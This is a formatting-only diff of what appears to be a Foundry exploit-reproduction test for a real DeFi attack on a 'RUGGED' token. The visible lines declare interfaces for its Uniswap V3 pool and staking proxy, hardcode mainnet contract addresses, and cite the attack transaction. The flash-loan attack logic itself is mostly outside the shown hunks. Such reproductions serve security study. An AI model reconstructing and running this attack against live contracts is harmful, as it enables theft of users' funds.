@@ -11,6 +11,7 @@ import "./../interface.sol";
 // Attack Tx : https://etherscan.io/tx/0x5a63da39b5b83fccdd825fed0226f330f802e995b8e49e19fbdd246876c67e1f
 
 interface IRUGGEDUNIV3POOL {
+
     function swap(
         address recipient,
         bool zeroForOne,
@@ -19,9 +20,11 @@ interface IRUGGEDUNIV3POOL {
         bytes calldata data
     ) external;
     function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
+
 }
 
 interface IRUGGEDPROXY {
+
     function claimReward() external;
     function targetedPurchase(uint256[] memory _tokenIds, UniversalRouterExecute calldata swapParam) external payable;
     function unstake(uint256 _amount) external;
@@ -32,16 +35,20 @@ interface IRUGGEDPROXY {
         bytes[] inputs;
         uint256 deadline;
     }
+
 }
 
 interface IRUGGED is IERC20 {
+
     function getTokenIdPool() external view returns (uint256[] memory);
     function ownerOf(uint256 id) external view returns (address owner);
+
 }
 
 interface IWeth is IERC20 {}
 
 contract ContractTest is Test {
+
     IRUGGEDUNIV3POOL pool = IRUGGEDUNIV3POOL(0x99147452078fa5C6642D3E5F7efD51113A9527a5);
     IRUGGEDPROXY proxy = IRUGGEDPROXY(0x2648f5592c09a260C601ACde44e7f8f2944944Fb);
     IRUGGED RUGGED = IRUGGED(0xbE33F57f41a20b2f00DEc91DcC1169597f36221F);
@@ -128,4 +135,5 @@ contract ContractTest is Test {
         RUGGED.balanceOf(address(this));
         proxy.stake(flashnumber);
     }
+
 }
